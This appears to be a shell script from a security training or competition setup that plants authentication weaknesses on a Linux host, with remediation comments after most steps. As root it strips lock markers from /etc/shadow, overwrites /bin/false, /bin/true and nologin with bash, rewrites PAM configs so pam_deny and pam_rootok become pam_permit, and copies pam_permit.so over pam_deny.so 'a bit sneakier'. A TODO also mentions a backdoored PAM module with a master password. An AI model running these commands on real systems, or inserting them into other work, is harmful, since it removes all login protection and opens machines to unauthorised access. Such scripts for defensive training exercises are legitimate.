#NAME pam_boop
#DESC thanks tristan
#LEVEL 2
##SET debug

# This script trashes your PAM configs and binaries. This means that anyone can log in without a password, or with any password.

# Replace all locked accounts with no password
# REMEDIATION: Password change script for all users, or re-lock system users with a script
sed -ie "s/*//g" /etc/shadow
sed -ie "s/\!//g" /etc/shadow

# Overwrite all non-login shells with bash
# REMEDIATION: Reinstall or overwrite non-login shells
cp -f /bin/bash /bin/false
cp -f /bin/bash /bin/true
cp -f /bin/bash /usr/sbin/nologin
cp -f /bin/bash /sbin/nologin

# Allow empty passwords when logging in
# REMEDIATION: Manually fix or pam-auth-update --force to reset pam configs
if [ -d "/etc/pam.d/password-auth" ]; then
    sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/password-auth
    sed -ie "s/try_first_pass//g" /etc/pam.d/password-auth
fi

if [ -d "/etc/pam.d/common-auth" ]; then
    sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/common-auth
fi

#STARTROULETTE 3
#ROULETTE

# If you attempt to log in or su to root, just allow it
sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/common-auth
sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/su

#ROULETTE

# Instead of denying unsuccessful PAM authentication attempts, permit them
sed -ie "s/pam_deny.so/pam_permit.so/g" /etc/pam.d/common-auth

#ROULETTE

# Replace pam_deny.so with pam_permit.so. Instead of denying unsuccessful PAM authentication attempts, permit them, but be a bit sneakier
# REMEDIATION: Reinstall pam modules, like with apt install --reinstall libpam-modules

# Some distros have pam modules in a different place, so let's check and see which folder they're in
if [ -f "/usr/lib/security/pam_permit.so" ]; then
    pam_path="/usr/lib/security/"
else
    pam_path="/lib/x86_64-linux-gnu/security/"
fi
cp -f $pam_path/pam_permit.so $pam_path/pam_deny.so

##ROULETTE

# Backdoored pam module allows a secret master password while appearing to work
# REMEDIATION: Reinstall pam modules
##TODO: custom pam shared object that allows one password all the time
## drop c file and compile

#ENDROULETTE
